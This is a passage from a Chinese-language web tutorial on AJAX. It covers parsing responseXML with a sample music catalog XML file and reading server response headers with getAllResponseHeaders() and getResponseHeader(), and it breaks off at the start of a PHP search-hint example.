XML 解析器。</p><p><code>ResponseXML</code> 属性以 XML DOM 对象返回服务器响应。</p><p>使用此属性，您可以把响应<em>解析</em>为 XML DOM 对象：</p><p>music_list.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">XML</span><br><span class="line"><span class="tag">&lt;<span class="name">CATALOG</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>再见<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>邓紫棋<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>新的心跳<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>邓紫棋工作室<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2016<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>All I Ask<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Adele<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>25<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>英国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>XL Recordings<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2015<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>之乎者也<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>罗大佑<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>青春舞曲<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>滚石唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Never Be Alone<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Shawn Mendes<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>Handwritten<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>加拿大<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>环球唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2015<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>慢慢<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>张学友<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>忘记你我做不到<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>环球唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1996<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Complicated<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Avril Lavigne<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>Let Go<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>加拿大<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>索尼音乐<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2002<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>三生三世<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>张杰<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>三生三世十里桃花<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>仁溪音乐<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2018<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Five Hundred Miles<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Justin Timberlake<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>Inside Llewyn Davis<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>华纳唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2013<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>演员<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>薛之谦<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>绅士<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>海蝶音乐<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2016<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Numb<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Linkin Park<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>Meteora<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>华纳唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>给未来的自己<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>梁静茹<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>崇拜<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>马来西亚<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>相信音乐<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2007<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>The Monster<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Rihanna<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>The Marshall Mathers LP2<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>巴巴多斯<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>环球唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2013<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>我终于失去了你<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>赵传<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>我终于失去了你<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>滚石唱片<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1989<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Main Titles<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Ramin Djawadi<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>Game of Thrones<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>德国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>索尼音乐<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2011<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>传奇<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>李健<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>似水流年<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>北京完美坚持文化艺术工作室<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TRACK</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>完美生活<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>许巍<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ALBUM</span>&gt;</span>时光漫步<span class="tag">&lt;/<span class="name">ALBUM</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>金牌大风<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>2002<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TRACK</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CATALOG</span>&gt;</span></span><br><span class="line">JS</span><br><span class="line">// 响应回来的数据，是一个XML DOM对象</span><br><span class="line">xmlDoc = xhttp.responseXML;</span><br><span class="line">txt = &quot;&quot;;</span><br><span class="line">// 获取 ARTIST 标签</span><br><span class="line">x = xmlDoc.getElementsByTagName(&quot;ARTIST&quot;);</span><br><span class="line">for (i = 0; i &lt; x.length; i++) &#123;</span><br><span class="line">    // 获取 ARTIST 第一个子节点（ARTIST的内容）</span><br><span class="line">    txt += x[i].childNodes[0].nodeValue + &quot;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = txt;</span><br><span class="line">// 发送请求</span><br><span class="line">xhttp.open(&quot;GET&quot;,  &quot;music_list.xml&quot;, true);</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></table></figure><h3 id="服务器响应方法"><a href="#服务器响应方法" class="headerlink" title="服务器响应方法"></a>服务器响应方法</h3><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">getResponseHeader()</td><td style="text-align:left">从服务器返回特定的头部信息</td></tr><tr><td style="text-align:left">getAllResponseHeaders()</td><td style="text-align:left">从服务器返回所有头部信息</td></tr></tbody></table></div><h5 id="getAllResponseHeaders-方法"><a href="#getAllResponseHeaders-方法" class="headerlink" title="getAllResponseHeaders() 方法"></a>getAllResponseHeaders() 方法</h5><p><code>getAllResponseHeaders()</code> 方法返回所有来自服务器响应的头部信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = </span><br><span class="line">            <span class="built_in">this</span>.getAllResponseHeaders();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        getAllResponseHeaders()方法返回的数据：</span></span><br><span class="line"><span class="comment">        cache-control: private,no-cache</span></span><br><span class="line"><span class="comment">content-length: 26562</span></span><br><span class="line"><span class="comment">content-type: text/html; Charset=utf-8</span></span><br><span class="line"><span class="comment">date: Thu, 14 Apr 2022 12:15:48 GMT</span></span><br><span class="line"><span class="comment">server: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="comment">x-powered-by: ASP.NET</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="getResponseHeader-方法"><a href="#getResponseHeader-方法" class="headerlink" title="getResponseHeader() 方法"></a>getResponseHeader() 方法</h5><p><code>getResponseHeader()</code> 方法返回来自服务器响应的特定（可以自己指定想要返回的响应头数据）头部信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = </span><br><span class="line">            <span class="built_in">this</span>.getResponseHeader(<span class="string">&quot;date&quot;</span>);<span class="comment">// Thu, 14 Apr 2022 12:15:48 GMT</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;ajax_info.txt&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.send(); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">响应头</span></span><br><span class="line"><span class="comment">cache-control: private,no-cache</span></span><br><span class="line"><span class="comment">content-length: 26562</span></span><br><span class="line"><span class="comment">content-type: text/html; Charset=utf-8</span></span><br><span class="line"><span class="comment">date: Thu, 14 Apr 2022 12:15:48 GMT</span></span><br><span class="line"><span class="comment">server: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="comment">x-powered-by: ASP.NET</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="Ajax-实例"><a href="#Ajax-实例" class="headerlink" title="Ajax 实例"></a>Ajax 实例</h1><h3 id="Ajax-PHP-实例"><a href="#Ajax-PHP-实例" class="headerlink" title="Ajax PHP 实例"></a>Ajax PHP 实例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">HTML</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XMLHttpRequest 对象<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>请在下面的输入字段中键入字母 A-Z：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>搜索建议：<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;txtHint&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- onkeyup=&quot;showHint(this.value)&quot;：onkeyup事件是当按键松开时触发该事件，this.value是获取input的值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>姓名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;txt1&quot;</span> <span class="attr">onkeyup</span>=<span class="string">&quot;showHint(this.value)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span 